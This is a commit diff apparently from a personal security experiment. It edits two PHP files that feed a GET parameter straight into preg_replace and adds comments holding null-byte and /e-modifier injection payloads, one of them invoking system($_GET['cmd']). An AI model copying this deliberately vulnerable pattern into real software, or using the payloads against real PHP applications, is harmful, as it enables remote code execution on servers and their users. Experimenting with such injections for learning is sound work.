a38ae3bb7ce3aa12d5fb3e601b5f1844febb5eb2
Ken Zhang <kyz211@nyu.edu>
2015-10-15 21:29:05 -0400

    moving forward with null byte injections

--- regex-testing-1.php
+++ regex-testing-1.php
@@ -5,9 +5,15 @@ error_reporting(-1);
 
 $string = "bluechill";
 $regex = $_GET['highlight'];
-$string = preg_replace("/". $regex . "/", '$0 * $1', $string);
+$string = preg_replace("/". $regex . "/", $_GET['highlight'] . ' * $1', $string);
 echo $string;
 echo "<br />";
 echo $regex;
+
+//blue|%20echo%20phpinfo();/e%00
+//blue/e%00&highlight=echo phpinfo();
+//blue/e%00&highlight=echo phpinfo();
+//||/e%00&highlight=echo%20phpinfo()
+//|||phpinfo()/e%00
 ?>
 
--- regex-testing-2.php
+++ regex-testing-2.php
@@ -6,8 +6,16 @@ error_reporting(-1);
 //how can you get /* to run?
 
 //$regex = $_GET['highlight'];
+
+//highlight=||/e%00&replacement=system($_GET['cmd']);&cmd=echo%20phpinfo() 
+
+blue|phpinfo()/e%00
+
 $string = preg_replace("/phpinfo\(\);/e", '$0', "phpinfo();");
 echo $string;
+
+//phpinfo\(\);\/\*/e", '$0', "phpinfo();");/*
+
 //echo
 ?>
 
